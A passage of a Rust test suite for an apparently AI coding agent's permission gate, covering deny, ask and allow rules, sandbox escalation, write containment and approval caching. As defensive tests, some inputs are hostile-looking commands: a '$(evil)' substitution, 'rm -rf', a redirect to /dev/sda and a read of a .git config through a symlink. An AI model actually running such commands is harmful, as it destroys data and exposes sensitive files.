        );
        for (name, input) in [
            (
                "bash",
                json!({"command": "echo ${VALUE:-default} > output.txt", "disable_sandbox": true}),
            ),
            ("powershell", json!({"command": "Set-Content x y"})),
        ] {
            let error = permissions.check(name, &input, 0).await.unwrap_err();
            assert!(
                error.contains("blocked by a deny permission rule"),
                "{error}"
            );
        }
        assert_eq!(approver.asked(), vec![]);
    }

    #[tokio::test]
    async fn manual_sandbox_escape_still_asks_and_describes_the_risk() {
        let escaping = json!({"command": "make install", "disable_sandbox": true});
        let approver = ScriptedApprover::new(vec![Decision::Deny]);
        let asked = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(!ok(&asked, "bash", escaping).await);
        assert_eq!(approver.ask_count(), 1);
        let notice = approver.asked()[0]
            .notice
            .clone()
            .expect("an escaping call carries a notice");
        assert!(notice.contains("no OS sandbox"), "{notice}");
        assert!(
            ok(
                &asked,
                "bash",
                json!({"command": "ls -la", "disable_sandbox": true})
            )
            .await
        );
        assert_eq!(approver.ask_count(), 1);
    }

    // ── layer 6: ask rules ──────────────────────────────────────────────

    #[tokio::test]
    async fn ask_rules_override_allow_and_are_not_cached() {
        let approver = ScriptedApprover::new(vec![
            Decision::Allow(ApprovalScope::Once),
            Decision::Allow(ApprovalScope::Once),
        ]);
        let p = gate(
            Mode::Manual,
            rules(&["bash(cargo *)"], &[], &["bash(cargo publish *)"]),
            approver.clone(),
        );
        assert!(
            ok(&p, "bash", bash("cargo build")).await,
            "allow rule covers build"
        );
        assert!(ok(&p, "bash", bash("cargo publish --dry-run")).await);
        assert!(ok(&p, "bash", bash("cargo publish --dry-run")).await);
        assert_eq!(approver.ask_count(), 2, "ask rule confirms every time");
        assert!(approver.asked().iter().all(|r| r.remember_rules.is_none()));
    }

    // ── layers 10/11: contained writes and allow rules ──────────────────

    /// The contained-writes layer is not a mode: plain `manual` runs a
    /// structured write that lands inside the cwd without asking, because
    /// dispatch already froze that target. Nothing else rides along — an
    /// escaping path and bash both still ask.
    #[tokio::test]
    async fn manual_auto_allows_contained_writes_inside_cwd_only() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&p, "write_file", file("src/main.rs")).await);
        assert!(
            ok(
                &p,
                "edit_file",
                json!({"path": "README.md", "old_string": "a", "new_string": "b"})
            )
            .await
        );
        assert!(
            !ok(&p, "write_file", file("/etc/hosts")).await,
            "outside cwd still asks"
        );
        assert!(
            !ok(&p, "write_file", file("../other/f.txt")).await,
            ".. escape still asks"
        );
        assert!(
            !ok(&p, "bash", bash("make build")).await,
            "bash is not a contained write"
        );
        assert_eq!(approver.ask_count(), 3);
    }

    /// The one layer above containment a user is expected to reach for: an
    /// `ask` rule puts every edit back in front of the human, every time, with
    /// nothing remembered. It is the whole of what a separate accept-edits
    /// mode was ever worth, in one config line — which is why there is no such
    /// mode.
    #[tokio::test]
    async fn an_ask_rule_outranks_containment_and_never_caches() {
        let approver = ScriptedApprover::new(vec![
            Decision::Allow(ApprovalScope::Once),
            Decision::Allow(ApprovalScope::Once),
        ]);
        let p = gate(
            Mode::Manual,
            rules(&[], &[], &["edit_file(**)"]),
            approver.clone(),
        );
        let edit = json!({"path": "src/main.rs", "old_string": "a", "new_string": "b"});
        assert!(ok(&p, "edit_file", edit.clone()).await);
        assert!(ok(&p, "edit_file", edit).await, "and again the next time");
        assert_eq!(approver.ask_count(), 2);
        assert!(
            approver.asked().iter().all(|r| r.remember_rules.is_none()),
            "an ask rule offers nothing to remember"
        );
        // Scoped like any other rule: the write tool it does not name stays
        // contained.
        assert!(ok(&p, "write_file", file("src/main.rs")).await);
        assert_eq!(approver.ask_count(), 2);
    }

    /// A `rebased` gate re-anchors containment: relative and in-tree writes
    /// for the NEW cwd (a worktree) auto-allow, while a path that was inside
    /// the OLD cwd now falls outside and asks — the sub-agent can't silently
    /// write the main tree just because its parent could.
    #[tokio::test]
    async fn rebased_reanchors_contained_writes_onto_the_new_cwd() {
        let approver = ScriptedApprover::new(vec![]);
        let parent = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let worktree = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let sub = parent.for_workspace(crate::project::WorkspaceIdentity::resolve(&worktree));
        assert!(
            ok(
                &sub,
                "write_file",
                file(&worktree.join("src/main.rs").to_string_lossy())
            )
            .await,
            "a write inside the worktree auto-allows"
        );
        assert!(
            ok(&sub, "write_file", file("src/main.rs")).await,
            "a relative write resolves against the worktree and auto-allows"
        );
        assert!(
            !ok(
                &sub,
                "write_file",
                file(&test_cwd().join("src/main.rs").to_string_lossy())
            )
            .await,
            "the parent's tree is now outside cwd and asks"
        );
        assert_eq!(approver.ask_count(), 1);
    }

    #[tokio::test]
    async fn allow_rules_match_tool_bash_prefix_and_path_glob() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(
                &[
                    "edit_file",
                    "bash(cargo *)",
                    "write_file(/elsewhere/src/**)",
                    "bash(make)",
                ],
                &[],
                &[],
            ),
            approver.clone(),
        );
        assert!(
            ok(
                &p,
                "edit_file",
                json!({"path": "any.rs", "old_string": "a", "new_string": "b"})
            )
            .await
        );
        assert!(ok(&p, "bash", bash("cargo test --all")).await);
        assert!(
            ok(&p, "bash", bash("cargo build && ls")).await,
            "readonly segment rides along"
        );
        assert!(
            ok(&p, "bash", bash("make")).await,
            "exact rule matches bare command"
        );
        // A path glob only has anything left to say outside the cwd: an
        // in-cwd write is contained and never reaches the allow layer.
        assert!(ok(&p, "write_file", file("/elsewhere/src/deep/mod.rs")).await);
        assert_eq!(approver.ask_count(), 0);

        assert!(
            !ok(&p, "bash", bash("make clean")).await,
            "exact rule is exact"
        );
        assert!(
            !ok(&p, "bash", bash("cargo build && make clean")).await,
            "one uncovered segment asks"
        );
        assert!(
            !ok(&p, "write_file", file("/elsewhere/docs/x.md")).await,
            "glob scope holds"
        );
        assert!(
            !ok(&p, "bash", bash("cargo $(evil)")).await,
            "opaque never matches allow"
        );
        assert_eq!(approver.ask_count(), 4);
    }

    // ── layer 12: session cache and remember payloads ──────────────────

    #[tokio::test]
    async fn allow_session_caches_two_word_prefix() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let before = p.capability_epoch();
        assert!(ok(&p, "bash", bash("git commit -m one")).await);
        let after_grant = p.capability_epoch();
        assert_eq!(
            after_grant,
            PermissionCapabilityEpoch {
                workspace_session: before.workspace_session + 1,
                ..before
            }
        );
        assert!(
            ok(&p, "bash", bash("git commit --amend")).await,
            "same two-word prefix cached"
        );
        assert_eq!(approver.ask_count(), 1);
        // different second word → asks again (script exhausted → deny)
        assert!(!ok(&p, "bash", bash("git rebase main")).await);
        assert_eq!(approver.ask_count(), 2);
    }

    #[tokio::test]
    async fn project_grant_is_durable_first_and_live_across_workspace_views() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::succeeding();
        let base = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
        let worktree = base.for_workspace(crate::project::WorkspaceIdentity::ephemeral(
            PathBuf::from("/work/tree"),
        ));
        let before = base.capability_epoch();

        assert!(ok(&worktree, "bash", bash("cargo build")).await);
        assert_eq!(
            writer.calls.lock().unwrap().as_slice(),
            &[vec!["bash(cargo build *)".to_string()]]
        );
        assert_eq!(base.project.snapshot().revision, 1);
        assert_eq!(base.capability_epoch().project, before.project + 1);
        assert!(
            ok(&base, "bash", bash("cargo build --release")).await,
            "the base workspace sees a successfully published project rule"
        );
        assert_eq!(approver.ask_count(), 1);
    }

    #[tokio::test]
    async fn failed_project_persistence_allows_once_without_publishing() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::failing();
        let permissions = gate_with_writer(Mode::Manual, approver.clone(), writer);

        let notice = permissions
            .check("bash", &bash("cargo build"), 0)
            .await
            .unwrap()
            .expect("persistence failure must be visible");
        assert!(notice.message.contains("not saved"));
        assert_eq!(
            permissions.project.snapshot(),
            ProjectPolicySnapshot::empty()
        );
        assert!(
            permissions
                .check("bash", &bash("cargo build --release"), 0)
                .await
                .is_err(),
            "the failed grant must not enter project policy or session cache"
        );
        assert_eq!(approver.ask_count(), 2);
    }

    /// Plan 144 (user, 2026-09-14: 「加了很多的 bash_script_no_sandbox,都命不
    /// 中,完全没意义了」). A trailing `2>&1` used to sink the whole script into
    /// the verbatim path, so a project that had already allowed `go test` was
    /// asked again on every test run — and the answer it wrote down was 200
    /// bytes of one-off command text that never matched anything again. The
    /// redirect moves a stream, not a file, so the argv is unchanged by it.
    #[tokio::test]
    async fn a_stream_only_redirect_keeps_the_prefix_rule_working() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(&["bash(go test *)"], &[], &[]),
            approver.clone(),
        );
        assert!(
            ok(
                &p,
                "bash",
                bash("cd sub && go test ./pkg -count=1 2>&1 | tail -3")
            )
            .await
        );
        assert_eq!(
            approver.ask_count(),
            0,
            "`cd` and `tail` are read-only segments; `go test` is what the rule is about"
        );

        // With no rule yet, what `p` writes is the reusable prefix — the same
        // rule the same command without the redirect would have produced.
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
        assert!(
            ok(
                &p,
                "bash",
                bash("cd sub && go test ./pkg -run 'X(Y)' 2>&1 | tail -3")
            )
            .await
        );
        assert_eq!(
            writer.calls.lock().unwrap().as_slice(),
            [vec!["bash(go test *)".to_string()]],
            "one prefix rule, not the whole command"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_persist_command_and_write_scopes_across_sessions() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
        let input = json!({
            "command": "cd /tmp && make check > /tmp/kloop-check.log 2>&1; echo \"EXIT:$?\" >> /tmp/kloop-check.log; tail -5 /tmp/kloop-check.log",
            "disable_sandbox": true
        });
        assert!(ok(&p, "bash", input).await);
        assert!(
            approver.asked()[0]
                .approval_scopes
                .contains(&ApprovalScope::Project)
        );
        let stored = writer.calls.lock().unwrap()[0].clone();
        let directory =
            PathFacts::gather_with_resolved(Path::new("/tmp/kloop-check.log"), &test_cwd(), None)
                .normalized
                .parent()
                .unwrap()
                .display()
                .to_string();
        assert_eq!(
            stored,
            vec![
                "bash(make check *)".to_string(),
                format!("bash_write({directory}/**)")
            ]
        );

        let next_approver = ScriptedApprover::new(vec![]);
        let restarted = gate(
            Mode::Manual,
            PermissionRules {
                allow: stored,
                ..Default::default()
            },
            next_approver.clone(),
        );
        assert!(ok(&restarted, "bash", json!({
            "command": "make check extra=1 > /tmp/kloop-next.log 2>&1; echo \"EXIT:${?}\" >> /tmp/kloop-next.log; tail -8 /tmp/kloop-next.log",
            "disable_sandbox": true
        })).await);
        assert_eq!(next_approver.asked(), vec![]);
        assert!(
            !ok(
                &restarted,
                "bash",
                bash("make install > /tmp/kloop-next.log")
            )
            .await
        );
        assert!(
            !ok(
                &restarted,
                "bash",
                bash("make check > /elsewhere/kloop-next.log")
            )
            .await
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_persist_escalation_with_separate_write_consent() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
        let command = "make check > /tmp/kloop-escalate.log 2>&1; echo \"EXIT:$?\" >> /tmp/kloop-escalate.log";
        assert_eq!(
            p.escalate_sandbox(command, None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        let stored = writer.calls.lock().unwrap()[0].clone();
        assert!(
            stored
                .iter()
                .any(|rule| rule.starts_with("sandbox_escalate_write("))
        );
        let next_approver = ScriptedApprover::new(vec![]);
        let restarted = gate(
            Mode::Manual,
            PermissionRules {
                allow: stored,
                ..Default::default()
            },
            next_approver.clone(),
        );
        assert!(restarted.sandbox_escalation_remembered(
            "make check jobs=2 > /tmp/kloop-escalate-next.log; echo \"EXIT:$?\" >> /tmp/kloop-escalate-next.log"));
        assert!(
            !restarted.sandbox_escalation_remembered("make check > /elsewhere/kloop-escalate.log")
        );
        assert!(
            !ok(
                &restarted,
                "bash",
                bash("make check > /tmp/kloop-escalate.log")
            )
            .await
        );
        assert_eq!(next_approver.ask_count(), 1);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn cwd_directory_targets_offer_no_reusable_bash_write_grant() {
        let cwd = std::fs::canonicalize(test_cwd()).unwrap();
        let outside = cwd.parent().unwrap().join("other/src/main.rs");
        for target in [".", "./", "logs/..", cwd.to_str().unwrap()] {
            let command = format!("make check > '{target}'");
            let call = CallFacts::gather("bash", &bash(&command), &test_cwd(), None);
            assert!(remember_payload("bash", &call).is_none(), "{target}");
            let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
            let writer = ScriptedWriter::succeeding();
            let p = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
            assert!(
                ok(
                    &p,
                    "bash",
                    json!({
                        "command": command,
                        "disable_sandbox": true
                    })
                )
                .await,
                "{target}"
            );
            assert!(!ok(&p, "bash", bash(&command)).await, "{target}");
            assert!(
                !ok(
                    &p,
                    "bash",
                    bash(&format!("make check > '{}'", outside.display()))
                )
                .await,
                "{target}"
            );
            let requests = approver.asked();
            assert_eq!(requests.len(), 3, "{target}");
            for request in &requests[..2] {
                assert_eq!(
                    request.approval_scopes,
                    vec![ApprovalScope::Once],
                    "{target}"
                );
                assert!(request.remember_rules.is_none(), "{target}");
            }
            assert!(writer.calls.lock().unwrap().is_empty(), "{target}");
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn cwd_directory_targets_offer_no_project_escalation_or_directory_memory() {
        let cwd = std::fs::canonicalize(test_cwd()).unwrap();
        let outside = cwd.parent().unwrap().join("other/src/main.rs");
        for target in [".", "./", "logs/..", cwd.to_str().unwrap()] {
            let command = format!("make check > '{target}'");
            assert!(
                escalation_remember_payload(&command, &test_cwd()).is_none(),
                "{target}"
            );
            let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
            let writer = ScriptedWriter::succeeding();
            let p = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
            assert_eq!(
                p.escalate_sandbox(&command, None, 0).await,
                EscalationOutcome::Approved(EscalationApproval::User),
                "{target}"
            );
            assert!(
                !approver.asked()[0]
                    .approval_scopes
                    .contains(&ApprovalScope::Project),
                "{target}"
            );
            assert!(!p.sandbox_escalation_remembered(&command), "{target}");
            let sibling = format!("make check > '{}'", outside.display());
            assert!(!p.sandbox_escalation_remembered(&sibling), "{target}");
            assert_eq!(
                p.escalate_sandbox(&sibling, None, 0).await,
                EscalationOutcome::Declined,
                "{target}"
            );
            assert_eq!(approver.ask_count(), 2, "{target}");
            assert!(writer.calls.lock().unwrap().is_empty(), "{target}");
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn cwd_root_log_project_rules_stay_within_the_canonical_directory() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver, writer.clone());
        assert!(
            ok(
                &p,
                "bash",
                json!({
                    "command": "make check > check.log",
                    "disable_sandbox": true
                })
            )
            .await
        );
        let directory = std::fs::canonicalize(test_cwd()).unwrap();
        let stored = writer.calls.lock().unwrap()[0].clone();
        assert_eq!(
            stored,
            vec![
                "bash(make check *)".to_string(),
                format!("bash_write({}/**)", directory.display())
            ]
        );
        let approver = ScriptedApprover::new(vec![]);
        let restarted = gate(
            Mode::Manual,
            PermissionRules {
                allow: stored,
                ..Default::default()
            },
            approver.clone(),
        );
        for target in ["next.log", "logs/next.log"] {
            assert!(
                ok(
                    &restarted,
                    "bash",
                    json!({
                        "command": format!("make check jobs=2 > {target}"),
                        "disable_sandbox": true
                    })
                )
                .await
            );
        }
        let outside = directory.parent().unwrap().join("outside.log");
        assert!(
            !ok(
                &restarted,
                "bash",
                json!({
                    "command": format!("make check > {}", outside.display()),
                    "disable_sandbox": true
                })
            )
            .await
        );
        assert_eq!(approver.ask_count(), 1);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn cwd_root_log_escalation_rules_stay_within_the_canonical_directory() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver, writer.clone());
        assert_eq!(
            p.escalate_sandbox("make check > check.log", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        let directory = std::fs::canonicalize(test_cwd()).unwrap();
        let stored = writer.calls.lock().unwrap()[0].clone();
        assert_eq!(
            stored,
            vec![
                "sandbox_escalate(make check *)".to_string(),
                format!("sandbox_escalate_write({}/**)", directory.display())
            ]
        );
        let approver = ScriptedApprover::new(vec![]);
        let restarted = gate(
            Mode::Manual,
            PermissionRules {
                allow: stored,
                ..Default::default()
            },
            approver.clone(),
        );
        assert!(restarted.sandbox_escalation_remembered("make check jobs=2 > next.log"));
        let outside = directory.parent().unwrap().join("outside.log");
        let command = format!("make check > {}", outside.display());
        assert!(!restarted.sandbox_escalation_remembered(&command));
        assert_eq!(
            restarted.escalate_sandbox(&command, None, 0).await,
            EscalationOutcome::Declined
        );
        assert_eq!(approver.ask_count(), 1);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn cwd_root_log_session_keys_include_the_canonical_directory() {
        let directory = std::fs::canonicalize(test_cwd()).unwrap();
        let call = CallFacts::gather("bash", &bash("make check > check.log"), &test_cwd(), None);
        assert_eq!(
            remember_payload("bash", &call).unwrap().signatures,
            vec![
                "bash:make check".to_string(),
                format!("bash-write:{}", directory.display())
            ]
        );
        assert_eq!(
            escalation_remember_payload("make check > check.log", &test_cwd())
                .unwrap()
                .signatures,
            vec![
                "sandbox_escalate:make check".to_string(),
                format!("sandbox_escalate-write:{}", directory.display())
            ]
        );
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&p, "bash", bash("make check > check.log")).await);
        assert!(ok(&p, "bash", bash("make check jobs=2 > next.log")).await);
        let outside = directory.parent().unwrap().join("outside.log");
        let command = format!("make check > {}", outside.display());
        assert!(!ok(&p, "bash", bash(&command)).await);
        assert_eq!(approver.ask_count(), 2);
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert_eq!(
            p.escalate_sandbox("make check > check.log", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        assert!(p.sandbox_escalation_remembered("make check jobs=2 > next.log"));
        assert!(!p.sandbox_escalation_remembered(&command));
        assert!(
            !p.fresh_session()
                .sandbox_escalation_remembered("make check > next.log")
        );
        for tool in ["bash", "sandbox_escalate"] {
            let call = CallFacts::gather(
                "bash",
                &bash("make check > /check.log"),
                Path::new("/"),
                None,
            );
            let remember = if tool == "bash" {
                remember_payload(tool, &call)
            } else {
                escalation_remember_payload("make check > /check.log", Path::new("/"))
            };
            assert!(
                remember.is_none(),
                "{tool}: filesystem root must not be suggested"
            );
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn cwd_root_log_legacy_wildcards_only_cover_canonical_cwd_targets() {
        let directory = std::fs::canonicalize(test_cwd()).unwrap();
        let outside = directory.parent().unwrap().join("outside.log");
        let command = format!("make check > {}", outside.display());
        for pattern in ["*", "**"] {
            let approver = ScriptedApprover::new(vec![]);
            let p = gate(
                Mode::Manual,
                rules(
                    &[
                        "bash(make check *)",
                        &format!("bash_write({pattern})"),
                        "sandbox_escalate(make check *)",
                        &format!("sandbox_escalate_write({pattern})"),
                    ],
                    &[],
                    &[],
                ),
                approver.clone(),
            );
            for target in ["next.log", "logs/next.log"] {
                let inside = format!("make check > {}", directory.join(target).display());
                assert!(ok(&p, "bash", bash(&inside)).await, "{pattern}");
                assert!(p.sandbox_escalation_remembered(&inside), "{pattern}");
            }
            assert!(
                !ok(
                    &p,
                    "bash",
                    json!({
                        "command": command,
                        "disable_sandbox": true
                    })
                )
                .await,
                "{pattern}"
            );
            assert!(!p.sandbox_escalation_remembered(&command), "{pattern}");
            assert_eq!(approver.ask_count(), 1);
            for tool in ["bash_write", "sandbox_escalate_write"] {
                let rule = parse_rule(&format!("{tool}({pattern})")).unwrap();
                let alias = PathFacts::gather_with_resolved(
                    &directory.join("alias/out.log"),
                    &directory,
                    Some(&outside),
                );
                assert!(
                    !rule.matches_shell_write(tool, &alias),
                    "{pattern}: canonical alias escaped cwd"
                );
            }
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_require_every_command_and_write_scope() {
        let command = bash("make check > /tmp/check.log 2>&1");
        for allow in [
            vec!["bash(make check *)"],
            vec!["bash_write(/tmp/**)", "bash_write(/private/tmp/**)"],
            vec!["bash"],
        ] {
            let approver = ScriptedApprover::new(vec![]);
            let p = gate(Mode::Manual, rules(&allow, &[], &[]), approver.clone());
            assert!(!ok(&p, "bash", command.clone()).await, "{allow:?}");
            assert_eq!(approver.ask_count(), 1);
        }
        let allow = [
            "bash(make check *)",
            "bash_write(/tmp/**)",
            "bash_write(/private/tmp/**)",
        ];
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Manual, rules(&allow, &[], &[]), approver.clone());
        assert!(ok(&p, "bash", command).await);
        assert!(
            !ok(
                &p,
                "bash",
                bash("make check > /tmp/check.log 2> /elsewhere/check.log")
            )
            .await
        );
        assert!(!p.sandbox_escalation_remembered("make check > /tmp/check.log"));
        let escalation = gate(
            Mode::Manual,
            rules(&["sandbox_escalate(make check *)"], &[], &[]),
            approver,
        );
        assert!(!escalation.sandbox_escalation_remembered("make check > /tmp/check.log"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_session_cache_tracks_commands_and_directories() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&p, "bash", bash("make check > /tmp/check.log")).await);
        assert!(ok(&p, "bash", bash("make check jobs=2 > /tmp/next.log")).await);
        assert_eq!(approver.ask_count(), 1);
        assert!(!ok(&p, "bash", bash("make install > /tmp/next.log")).await);
        assert!(!ok(&p, "bash", bash("make check > /elsewhere/next.log")).await);
        assert!(
            !ok(
                &p.fresh_session(),
                "bash",
                bash("make check > /tmp/next.log")
            )
            .await
        );

        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert_eq!(
            p.escalate_sandbox("make check > /tmp/check.log", None, 0)
                .await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        assert!(p.sandbox_escalation_remembered("make check jobs=2 > /tmp/next.log"));
        assert!(!p.sandbox_escalation_remembered("make check > /elsewhere/next.log"));
        assert!(!p.sandbox_escalation_remembered("make install > /tmp/next.log"));
        assert!(
            !p.fresh_session()
                .sandbox_escalation_remembered("make check > /tmp/next.log")
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_respect_hard_gates_and_explicit_asks() {
        let allow = [
            "bash(make check *)",
            "bash_write(/tmp/**)",
            "bash_write(/private/tmp/**)",
        ];
        for deny in [
            "bash(make check *)",
            "bash_write(/tmp/**)",
            "bash_write(/private/tmp/**)",
        ] {
            let approver = ScriptedApprover::new(vec![]);
            let p = gate(Mode::Manual, rules(&allow, &[deny], &[]), approver.clone());
            // deny 同时检查原文与规范目标，分别验证两种路径拼写。
            let input = if deny.starts_with("bash_write") {
                bash(&format!(
                    "make check > {}/check.log",
                    if deny.contains("/private/") {
                        "/private/tmp"
                    } else {
                        "/tmp"
                    }
                ))
            } else {
                bash("make check > /tmp/check.log")
            };
            assert!(
                p.check_call("bash", &input, 0, true)
                    .await
                    .unwrap_err()
                    .contains("deny permission rule")
            );
            assert_eq!(approver.ask_count(), 0);
        }
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once); 2]);
        let p = gate(
            Mode::Manual,
            rules(
                &allow,
                &[],
                &["bash_write(/tmp/**)", "bash_write(/private/tmp/**)"],
            ),
            approver.clone(),
        );
        for _ in 0..2 {
            assert!(
                p.check_call("bash", &bash("make check > /tmp/check.log"), 0, true)
                    .await
                    .is_ok()
            );
        }
        assert_eq!(approver.ask_count(), 2);
        assert!(
            approver
                .asked()
                .iter()
                .all(|req| req.remember_rules.is_none())
        );

        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Plan, rules(&allow, &[], &[]), approver.clone());
        let input = bash("echo done > /tmp/check.log");
        assert!(
            p.check_call("bash", &input, 0, true)
                .await
                .unwrap_err()
                .contains("plan mode")
        );
        assert!(!crate::tools::Builtin::Bash.concurrency_safe(&input));
        assert!(crate::tools::Builtin::Bash.concurrency_safe(&bash("echo \"EXIT:$?\"")));
        assert_eq!(approver.ask_count(), 0);

        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(&["bash", "bash_write(/**)"], &[], &[]),
            approver.clone(),
        );
        assert!(!ok(&p, "bash", bash("rm -rf build > /tmp/check.log")).await);
        assert!(approver.asked()[0].description.contains("[destructive]"));
        assert!(!ok(&p, "bash", bash("echo result > /dev/sda")).await);
        assert!(
            approver.asked()[1]
                .description
                .contains("[sensitive redirect path]")
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_match_canonical_write_targets_and_keep_sensitive_reads_blocked() {
        let root =
            std::env::temp_dir().join(crate::resource_id::fresh("kloop-log-scopes-").unwrap());
        let logs = root.join("logs");
        let outside = root.join("outside");
        let sensitive = root.join(".git");
        for dir in [&logs, &outside, &sensitive] {
            std::fs::create_dir_all(dir).unwrap();
        }
        std::os::unix::fs::symlink(&outside, logs.join("alias")).unwrap();
        std::os::unix::fs::symlink(&sensitive, logs.join("vcs")).unwrap();
        std::os::unix::fs::symlink(&sensitive, root.join("vcs-alias")).unwrap();
        let logs = std::fs::canonicalize(logs).unwrap();
        let allow = vec![
            "bash(make check *)".to_string(),
            format!("bash_write({}/**)", logs.display()),
        ];
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            PermissionRules {
                allow: allow.clone(),
                ..Default::default()
            },
            approver.clone(),
        );
        assert!(
            !ok(
                &p,
                "bash",
                bash(&format!("make check > {}/alias/out.log", logs.display()))
            )
            .await
        );
        assert!(approver.asked()[0].remember_rules.is_some());
        for _ in 0..2 {
            assert!(
                !ok(
                    &p,
                    "bash",
                    bash(&format!("make check > {}/vcs/out.log", logs.display()))
                )
                .await
            );
        }
        assert!(
            approver.asked()[1..]
                .iter()
                .all(|req| req.remember_rules.is_none()
                    && req.description.contains("[sensitive redirect path]"))
        );
        let input = bash(&format!(
            "cat {} > {}/out.log",
            root.join("vcs-alias/config").display(),
            logs.display()
        ));
        assert!(
            p.check_call("bash", &input, 0, true)
                .await
                .unwrap_err()
                .contains("sensitive path")
        );
        assert_eq!(approver.ask_count(), 3);

        let denied = Permissions::new(
            Mode::Bypass,
            &PermissionRules {
                allow,
                deny: vec![format!("bash_write({}/**)", logs.display())],
                ask: vec![],
            },
            test_cwd(),
            None,
        )
        .unwrap();
        assert!(
            denied
                .check(
                    "bash",
                    &bash(&format!("make check > {}/alias/out.log", logs.display())),
                    0
                )
                .await
                .unwrap_err()
                .contains("deny permission rule")
        );
        std::fs::remove_dir_all(root).unwrap();
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_do_not_turn_literal_directory_names_into_glob_grants() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
        assert!(ok(&p, "bash", bash("make check > '/tmp/log[123]/out.log'")).await);
        assert_eq!(
            approver.asked()[0].approval_scopes,
            vec![ApprovalScope::Once]
        );
        assert!(writer.calls.lock().unwrap().is_empty());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn log_wrappers_preserve_leading_spaces_in_directory_rules() {
        let directory = crate::resource_id::fresh(" logs-").unwrap();
        let command = format!("make check > '{directory}/first.log'");
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Project)]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver, writer.clone());
        assert!(ok(&p, "bash", bash(&command)).await);
        let stored = writer.calls.lock().unwrap()[0].clone();
        assert_eq!(
            stored,
            vec![
                "bash(make check *)".to_string(),
                format!("bash_write({directory}/**)")
            ]
        );
        let restarted = gate(
            Mode::Manual,
            PermissionRules {
                allow: stored,
                ..Default::default()
            },
            ScriptedApprover::new(vec![]),
        );
        assert!(
            ok(
                &restarted,
                "bash",
                bash(&format!("make check > '{directory}/next.log'"))
            )
            .await
        );
        let escalation = gate(
            Mode::Manual,
            rules(
                &[
                    "sandbox_escalate(make check *)",
                    &format!("sandbox_escalate_write({directory}/**)"),
                ],
                &[],
                &[],
            ),
            ScriptedApprover::new(vec![]),
        );
        assert!(escalation.sandbox_escalation_remembered(&command));
    }

